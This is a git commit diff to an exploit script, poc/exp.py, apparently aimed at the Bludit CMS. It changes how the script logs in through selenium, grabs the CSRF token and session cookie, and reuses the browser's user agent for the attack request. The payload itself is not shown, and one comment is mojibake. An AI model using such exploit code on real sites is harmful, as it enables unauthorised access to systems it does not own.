f237bd3821cef1e3b00a513ed708de3745b3a23c
zzxin107 <972844082@qq.com>
2020-05-24 16:05:47 +0800

    修改exp

--- poc/exp.py
+++ poc/exp.py
@@ -2,11 +2,6 @@
 import sys
 from selenium import webdriver
 import requests
-from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait  # available since 2.4.0
-from selenium.webdriver.support import expected_conditions as EC
 
 
 def login(host):
@@ -27,14 +22,15 @@ def login(host):
     driver.find_element_by_xpath('/html/body/div[3]/div/div[1]/ul/li[4]/a').click()  # µã»÷×«Ð´ÎÄÕÂ
     csrftoken = driver.find_element_by_xpath('//*[@id="jstokenCSRF"]')
     ctoken = csrftoken.get_attribute('value')
-    return ctoken, cookie_b
+    user_agent = driver.execute_script("return navigator.userAgent;")
+    return ctoken, cookie_b,user_agent 
 
-def exp(host, token, cookie_b):
+def exp(host, token, cookie_b,user_agent):
     cookies = {
         'BLUDIT-KEY': cookie_b
     }
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+        'User-Agent': user_agent,
         'Content-Type': 'multipart/form-data; boundary=--------327107347321150223463725464476',
         'Origin': host,
         'Referer': host + '/admin/new-content',
@@ -72,4 +68,5 @@ if __name__ == '__main__':
     tup = login(h)
     token = tup[0]
     cookie_b = tup[1]
-    exp(h, token, cookie_b)
+    user_agent = tup[2]
+    exp(h, token, cookie_b,user_agent )
